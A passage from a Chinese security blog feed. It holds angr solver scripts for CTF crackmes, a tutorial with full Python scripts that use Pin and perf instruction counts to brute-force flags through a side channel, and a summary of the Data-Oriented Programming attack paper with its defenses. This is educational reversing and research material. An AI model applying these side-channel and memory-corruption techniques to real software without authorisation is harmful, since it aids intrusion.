class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048699</span> </span><br><span class="line"></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    password0 = claripy.BVS(<span class="string">'password0'</span>,<span class="number">64</span>)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">'password1'</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    fake_heap_address0 = <span class="number">0xffffc93c</span></span><br><span class="line">    fake_heap_address1 = <span class="number">0xffffc94c</span></span><br><span class="line"></span><br><span class="line">    pointer_to_malloc_memory_address0 = <span class="number">0x8135468</span></span><br><span class="line">    pointer_to_malloc_memory_address1 = <span class="number">0x8135470</span></span><br><span class="line"></span><br><span class="line">    init_state.memory.store(pointer_to_malloc_memory_address0,fake_heap_address0,endness=project.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(pointer_to_malloc_memory_address1,fake_heap_address1,endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_heap_address0,password0)</span><br><span class="line">    init_state.memory.store(fake_heap_address1,password1)</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        sulution0=solution_state.se.eval(password0,cast_to=bytes)</span><br><span class="line">        sulution1=solution_state.se.eval(password1,cast_to=bytes)</span><br><span class="line">        print(<span class="string">b" "</span>.join([sulution0,sulution1]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-wen-jian">符号化文件</span><a href="#pfu-hao-hua-wen-jian" class="header-anchor">#</a></h3><ul><li><code>07_angr_symbolic_file</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%64s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">  ignore_me((<span class="keyword">int</span>)<span class="built_in">buffer</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  fp = fopen(<span class="string">"JKOYZJZV.txt"</span>, <span class="string">"rb"</span>);</span><br><span class="line">  fread(<span class="built_in">buffer</span>, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">"JKOYZJZV.txt"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">134520992</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(<span class="built_in">buffer</span>, <span class="string">"QAIIDABN"</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里需要从文件读取内容，所以需要自己符号化文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line"></span><br><span class="line">    start_address = <span class="number">0x80488D6</span> </span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    filename = <span class="string">"JKOYZJZV.txt"</span></span><br><span class="line">    symbolic_file_size_bytes = <span class="number">0x40</span></span><br><span class="line">    </span><br><span class="line">    password = claripy.BVS(<span class="string">'password'</span>, symbolic_file_size_bytes * <span class="number">8</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment">#file_options = 'r'</span></span><br><span class="line">    password_file = angr.storage.SimFile(filename, content=password,size = symbolic_file_size_bytes)</span><br><span class="line"></span><br><span class="line">    init_state.fs.insert(filename,password_file)</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.se.eval(password,cast_to=bytes)</span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>pin/perf在CTF逆向中的应用</title>
    <url>/c61763eb.html</url>
    <content><![CDATA[<blockquote><p>在”深度优先“的学习过程中发现了pin这个工具，之前对于平坦化的程序只会用deflat脚本去平坦化，去不了就只能苦逼的硬调了，直到发现了pin这个工具，打开了侧信道的大门，然后也在搜学习资料的时候搜到了比较轻量的perf工具</p></blockquote><a id="more"></a><p>比较典型的题目有2019 DDCTF 的confused，这里主要拿自己出的一道题目讲一下用法。</p><h3><span id="pan-zhuang">安装</span><a href="#pan-zhuang" class="header-anchor">#</a></h3><h4><span id="ppin">pin</span><a href="#ppin" class="header-anchor">#</a></h4><p>下载地址：<a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html" target="_blank" rel="noopener">https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html</a></p><p>下载对应系统的pin即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -c https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.13-98189-g60a6ef199-gcc-linux.tar.gz</span><br><span class="line">tar -xvf pin-3.13-98189-g60a6ef199-gcc-linux.tar.gz</span><br><span class="line">mv pin-3.13-98189-g60a6ef199-gcc-linux pin</span><br><span class="line">cd pin/source/tools/ManualExamples/</span><br><span class="line">make all TAEGET=intel64</span><br><span class="line">make all TAEGET=ia32</span><br></pre></td></tr></table></figure><h4><span id="pperf">perf</span><a href="#pperf" class="header-anchor">#</a></h4><p>ubuntu 16.04， 内核为4.4.0-177</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install linux-tools-common</span><br><span class="line">apt install linux-tools-4.4.0-177-generic</span><br><span class="line">apt install linux-cloud-tools-4.4.0-177-generic</span><br></pre></td></tr></table></figure><h3><span id="pshi-yong">使用</span><a href="#pshi-yong" class="header-anchor">#</a></h3><p>侧信道的攻击主要是根据程序执行的指令数目进行攻击，因此只演示指令计数的使用方法</p><h4><span id="ppin">pin</span><a href="#ppin" class="header-anchor">#</a></h4><p>pintools的使用为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path&#x2F;to&#x2F;pin -t path&#x2F;to&#x2F;your&#x2F;pintool -- path&#x2F;to&#x2F;binary &lt;arg&gt;</span><br></pre></td></tr></table></figure><p>举例来说，在我这里使用pin如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;pin&#x2F;pin -t .&#x2F;pin&#x2F;source&#x2F;tools&#x2F;ManualExamples&#x2F;obj-intel64&#x2F;inscount0.so -- .&#x2F;Just_reverse_it</span><br><span class="line">Input your flag:</span><br><span class="line">12</span><br><span class="line">Sorry</span><br><span class="line">$ cat inscount.out</span><br><span class="line">Count 1941819</span><br></pre></td></tr></table></figure><p>这里的Count就是从程序开始执行到退出所执行的指令数目了</p><h4><span id="pperf">perf</span><a href="#pperf" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ perf stat -x : -e instructions:u .&#x2F;Just_reverse_it</span><br><span class="line">Input your flag:</span><br><span class="line">12</span><br><span class="line">Sorry</span><br><span class="line">1941433::instructions:u:1330133:100.00</span><br></pre></td></tr></table></figure><p>这里的1941433就是perf统计指令执行的指令数目了</p><h3><span id="pli-ti">例题</span><a href="#pli-ti" class="header-anchor">#</a></h3><p>二进制文件：<a href="https://github.com/ycdxsb/Challenges/blob/master/MyChallenges/Just_reverse_it/attachment/Just_reverse_it" target="_blank" rel="noopener">Just_reverse_it</a></p><p>题目是一道简单的虚拟机题，逻辑如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># data[i]&#x3D;0x12^data[i-1]^(input[i]-i)</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">    mov reg1,input[reg3]</span><br><span class="line">    dec reg1,reg3</span><br><span class="line">    xor reg2,reg1</span><br><span class="line">    mov reg1,0xCD</span><br><span class="line">    xor reg1,reg2</span><br><span class="line">    cmp reg1,data[i]</span><br><span class="line">    mov reg2,reg1</span><br><span class="line">    jz continue</span><br><span class="line">    return 0 </span><br><span class="line">continue:</span><br><span class="line">    inc reg3</span><br><span class="line">    cmp reg3,const</span><br><span class="line">    jb loop</span><br><span class="line">    return 1</span><br></pre></td></tr></table></figure><p>可以看到当其中一个字节输入错误后，就会立刻跳出，而输入正确就会进入下一个字节的运算和比较，因此正确和错误，执行的指令数的差别，就能让我们使用侧信道的攻击方法了。</p><h4><span id="ppin-exp">pin exp</span><a href="#ppin-exp" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCmd</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        sout, serr = res.communicate()</span><br><span class="line">        <span class="keyword">return</span> res.returncode, sout, serr, res.pid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initPin</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        self.res = res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinWrite</span><span class="params">(self, input)</span>:</span></span><br><span class="line">        self.res.stdin.write(input)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinRun</span><span class="params">(self)</span>:</span></span><br><span class="line">        sout, serr = self.res.communicate()</span><br><span class="line">        <span class="keyword">return</span> sout, serr</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"~/pin/pin -t ~/pin/source/tools/ManualExamples/obj-intel64/inscount0.so -- ./Just_reverse_it"</span></span><br><span class="line"></span><br><span class="line">shell = Shell()</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chs=string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    max_ch = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chs:</span><br><span class="line">        tmp = s + ch +(<span class="number">48</span>-len(s)<span class="number">-1</span>)*<span class="string">'a'</span></span><br><span class="line">        shell.initPin(cmd)</span><br><span class="line">        shell.pinWrite(tmp)</span><br><span class="line">        sout,serr = shell.pinRun()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'inscount.out'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            count = f.readline().split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">        count = int(count)</span><br><span class="line">        <span class="keyword">if</span>(count&gt;max_num):</span><br><span class="line">            max_num = count</span><br><span class="line">            max_ch = ch</span><br><span class="line">    s+=max_ch</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure><h4><span id="pperf-exp">perf exp</span><a href="#pperf-exp" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCmd</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        sout, serr = res.communicate()</span><br><span class="line">        <span class="keyword">return</span> res.returncode, sout, serr, res.pid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initPin</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        self.res = res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinWrite</span><span class="params">(self, input)</span>:</span></span><br><span class="line">        self.res.stdin.write(input)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinRun</span><span class="params">(self)</span>:</span></span><br><span class="line">        sout, serr = self.res.communicate()</span><br><span class="line">        <span class="keyword">return</span> sout, serr</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'perf stat -x : -e instructions:u ./Just_reverse_it'</span></span><br><span class="line"></span><br><span class="line">shell = Shell()</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chs=string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    max_ch = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chs:</span><br><span class="line">        tmp = s + ch +(<span class="number">48</span>-len(s)<span class="number">-1</span>)*<span class="string">'a'</span></span><br><span class="line">        shell.initPin(cmd)</span><br><span class="line">        shell.pinWrite(tmp)</span><br><span class="line">        sout,serr = shell.pinRun()</span><br><span class="line">        sout = sout.split(<span class="string">'\n'</span>)[<span class="number">2</span>]</span><br><span class="line">        count = int(sout.split(<span class="string">'::'</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span>(count&gt;max_num):</span><br><span class="line">            max_num = count</span><br><span class="line">            max_ch = ch</span><br><span class="line">    s+=max_ch</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>侧信道的好处在于只需要进行简单的分析，剩下的躺着拿flag就行了，但对于一些指令数目差距不大的题目，侧信道也并不是那么简单，需要自己找一下规律或者改写自己的pin工具。反正我现在碰到简单输入flag的逆向就想先侧一侧或者angr一下。</p><p>总之能用最好，不能用也不亏，花不了很多时间。</p><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><p><a href="https://m4x.fun/post/perf-in-ctf/" target="_blank" rel="noopener">https://m4x.fun/post/perf-in-ctf/</a></p></li><li><p><a href="http://m4x.fun/post/pin-in-ctf/" target="_blank" rel="noopener">http://m4x.fun/post/pin-in-ctf/</a></p></li><li><p><a href="https://blog.csdn.net/qq_33438733/article/details/81108186" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81108186</a></p></li><li><p><a href="https://blog.csdn.net/qq_33438733/article/details/81137057" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81137057</a></p></li><li><p><a href="http://brieflyx.me/2017/binary-analysis/intel-pin-intro/" target="_blank" rel="noopener">http://brieflyx.me/2017/binary-analysis/intel-pin-intro/</a></p></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks(S&amp;P 2016)</title>
    <url>/c30e365e.html</url>
    <content><![CDATA[<blockquote><p>根据控制流的攻击我们知道有ROP和JOP，分别利用包含ret和jmp的Gadgets进行攻击，劫持控制流。</p><p>非控制数据攻击通过攻击程序内存，达到信息泄露或者权限提升等目的。文中提出了DOP攻击，利用程序中的Gadgets，构造任意x86程序的非控制数据攻击，并且这种攻击是图灵完备的。</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>控制流劫持攻击是目前主流的攻击，例如ROP及其变种，但对此人们也有很多防御措施：CFI、CCFI、CPI、TASR、ASLR、DEP等。</p><p>从程序的执行角度，我们可以想到程序是存在控制流和数据流的，而以上只能保证控制流部分的安全，对于数据流则无无能为力，所以非控制数据流攻击就成了额外的攻击方法，只要修改内存中的几个字节，就能达成攻击目的。</p><p><strong>本文方法</strong>：</p><ul><li>找DOP的gadgets——模拟图灵运算</li><li>找gadgets dispatcher——串联Gadgets</li></ul><p><strong>实验结果</strong>：</p><ul><li>9个程序中找到了7518个gadget和5092个gadgets dispatcher</li><li>其中8个程序能模拟任意计算，2个可以达成图灵完全攻击</li></ul><p>最后也实现了3种端到端的攻击，并且ASLR和DEP对攻击无作用。</p><h2><span id="pproblem">Problem</span><a href="#pproblem" class="header-anchor">#</a></h2><h3><span id="pbackground-non-control-data-attacks">Background: Non-control Data Attacks</span><a href="#pbackground-non-control-data-attacks" class="header-anchor">#</a></h3><p>通过直接攻击数据流来达到攻击目的，例如下图中，我们只要修改变量<code>pw-&gt;pw_uid</code>的值，就能达到提权的目的</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134306.jpg" alt="image-20200526132809230"></p><h3><span id="pexample-of-data-oriented-programming">Example of Data-oriented Programming</span><a href="#pexample-of-data-oriented-programming" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134310.jpg" alt="image-20200526133329831"></p><p>能看懂啊line 7 存在溢出，因此buf溢出能控制局部变量(tyoe,size,connect_limie)，同时局部变量又能修改指针（line12，line13）这种就称为<code>data-oriented gadgets</code>，同时可以注意到它们都在while循环中，因此可以连续的利用，称为<code>gadget dispatchers</code></p><p>通过对上图中的DOP利用，能够更新Code3链表中的函数，并且这种攻击时满足CFG完整性的</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134315.jpg" alt="image-20200526133757036"></p><h3><span id="pquestions">Questions</span><a href="#pquestions" class="header-anchor">#</a></h3><ul><li>DOP gadgets和gadgets dispatcher存在普遍吗？</li><li>能否根据需要链式gadgets达到攻击，是否图灵完备？</li><li>能否突破当期的防御机制？</li></ul><h2><span id="pdata-oriented-programming">DATA-ORIENTED PROGRAMMING</span><a href="#pdata-oriented-programming" class="header-anchor">#</a></h2><h3><span id="pdop-overview">DOP Overview</span><a href="#pdop-overview" class="header-anchor">#</a></h3><p>DOP主要是模拟表达式计算，因此定义了如下DOP语言</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134324.jpg" alt="image-20200526134248369"></p><p>包括六种虚拟指令，实现算术、逻辑、赋值、加载、存储、跳转、条件跳转等操作。</p><h3><span id="pdata-oriented-gadgets">Data-Oriented Gadgets</span><a href="#pdata-oriented-gadgets" class="header-anchor">#</a></h3><p>DOP的gadgets不能使用寄存器，使用内存来模拟寄存器。面向数据的gadgets模拟了三种micro-operation：加载，运算和写入。</p><p>DOP和ROP很像，他们的区别主要在于以下两点：</p><ol><li>DOP的gadgets只能使用内存来传递操作的结果，而ROP的gadgets可以使用寄存器。</li><li>DOP的gadgets必须符合控制流图（CFG），不能发生非法的控制流转移，而且无需一个接一个的执行。而ROP的gadgets必须成链，顺序执行。</li></ol><p><strong>模拟算数运算</strong>：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134329.jpg" alt="image-20200526135232984"></p><p><strong>模拟赋值运算</strong>：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134334.jpg" alt="image-20200526135300192"></p><p><strong>模拟加载，存储运算</strong>：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134339.jpg" alt="image-20200526135344429"></p><h3><span id="pgadgets-dispatcher">Gadgets Dispatcher</span><a href="#pgadgets-dispatcher" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134343.jpg" alt="image-20200526143825499"></p><p>Dispatcher用来对gadgets进行迭代调度，在每一轮迭代中选用不同的gadgets对上一轮的结果进行处理，为了将第i次迭代的输出和第 i+1 次迭代的输入对应，gadgets将第 i+1 的加载地址设置为第 i 次迭代的存储地址。</p><p>除了上述多轮的攻击，还存在一种非交互式的DOP攻击。这种攻击要求攻击者一次性将攻击载荷输入，为了支持这样的攻击，MINDOP中也保留了两个跳转指令，能实现跳转</p><p><strong>模拟跳转</strong>：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134348.jpg" alt="image-20200526144557526"></p><p>关键是找到一个合适的变量，可以在每次循环迭代中修改的虚拟 PC 指针，如上述代码，有一个内存指针 <code>pubf -&gt; current</code>，指向了恶意网络输入的缓冲区。在每一次循环迭代中，代码从该缓冲区读取一行，然后在循环体中处理它，因此这个指针可以用来模拟虚拟 PC 指针。对于模拟非条件跳转，攻击者只需要配置好内存，来触发另一个操作 gadgets（如加法、赋值）来改变虚拟 PC 指针的值。</p><h2><span id="pdop-attack-construction">DOP ATTACK CONSTRUCTION</span><a href="#pdop-attack-construction" class="header-anchor">#</a></h2><p>这里总结一下在DOP过程中需要解决的<strong>三个问题</strong>：</p><ul><li>DOP gadgets识别</li><li>DOP gadgets dispatcher识别</li><li>DOP gadgets的拼接利用，在保证程序不崩溃的前提下进行攻击</li></ul><h3><span id="pgadget-identification">Gadget Identification</span><a href="#pgadget-identification" class="header-anchor">#</a></h3><p>一个有用的DOP gadgets需要满足一下<strong>两个条件</strong>：</p><ul><li>满足MINDOP语义。包含加载、存储、运算指令</li><li>在顺序上应该满足加载、运算、存储的顺序。</li></ul><p>使用LLVM实现对DOP gadgets的识别 (<a href="https://github.com/melynx/DOP-StaticAssist" target="_blank" rel="noopener">https://github.com/melynx/DOP-StaticAssist</a>)：LLVM IR提供了比二进制更多的程序语义，同时避免了对程序源码的解析。它还允许对任何有LLVM前端的语言编写的源码进行语言诊断分析。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134354.jpg" alt="image-20200526150317786"></p><p><strong>gadgets分类</strong>：根据语义和运算的变量分为三类，并且在使用优先级上全局变量gadgets&gt;函数参数gadgets&gt;局部变量gadgets</p><ul><li>全局变量gadgets：操作全局变量</li><li>函数参数gadgets：操作函数参数</li><li>局部变量gadgets：操作局部变量</li></ul><h3><span id="pdispatcher-identification">Dispatcher Identification</span><a href="#pdispatcher-identification" class="header-anchor">#</a></h3><p>同样也基于LLVM IR 实现（<a href="https://github.com/melynx/DOP-StaticAssist%EF%BC%89" target="_blank" rel="noopener">https://github.com/melynx/DOP-StaticAssist）</a></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134359.jpg" alt="image-20200526150809559"></p><h3><span id="pattack-contruction">Attack Contruction</span><a href="#pattack-contruction" class="header-anchor">#</a></h3><p>前提：需要攻击者能够控制第一个gadget加载的地址或者第一个gadget存储的地址</p><p><strong>攻击步骤</strong>：</p><ul><li>Gadget preparation (Semi-automated).：根据一个程序错误，定位到漏洞函数，然后找函数中的gadget dispatcher</li><li>Exploit chain construction (Manual)：将预期的恶意 MinDOP 程序输入，每一个 MinDOP 操作由DOP gadgets 实现，并根据优先级选择合适的 gadgets</li><li>Stitchability verification (Manual)：验证是否成功，如果不行回到上一步</li></ul><h2><span id="pevaluation">Evaluation</span><a href="#pevaluation" class="header-anchor">#</a></h2><p>在Evalution中回答了三个问题：</p><ul><li>DOP gadgets和gadgets dispatcher存在普遍吗？</li><li>能否根据需要链式gadgets达到攻击，是否图灵完备？</li><li>能否突破当期的防御机制（ASLR/DEP）？</li></ul><h3><span id="pq1">Q1</span><a href="#pq1" class="header-anchor">#</a></h3><p>在9个程序中找到了7518个gadgets和5052个gadgets dispatcher，因此是普遍存在的</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134404.jpg" alt="image-20200526152840994"></p><h3><span id="pq2-amp-q3">Q2&amp;Q3</span><a href="#pq2-amp-q3" class="header-anchor">#</a></h3><p>通过对实际漏洞的攻击完成说明，见论文部分</p><h2><span id="pdiscussion">Discussion</span><a href="#pdiscussion" class="header-anchor">#</a></h2><p>DOP目前已经实现了对ASLR、DEP、TASR防御的突破，但也可能可以通过以下方法进行防御</p><ul><li>memory security：通过检测恶意内存损坏来防止出现内存错误。</li><li>Data-Flow Integrity：类似于CFI在控制流完整性上的防御。</li><li>Fine-grained Data-Plane Randomization：细粒度的数据面随机化可以缓解 DOP 攻击，因为 DOP 仍然需要获取某些非控制数据指针的地址。</li><li>Hardware and Software Fault Isolation:内存隔离被广泛用于防止未经授权访问高权限资源，只有合法的代码区域才能访问特定的资源，这样可以防止一些直接的数据破坏攻击。</li></ul><p>总体来说，上述保护措施都会对程序执行带来极大的开销，只是能用来防御，但也需要考量效率问题。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>others</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
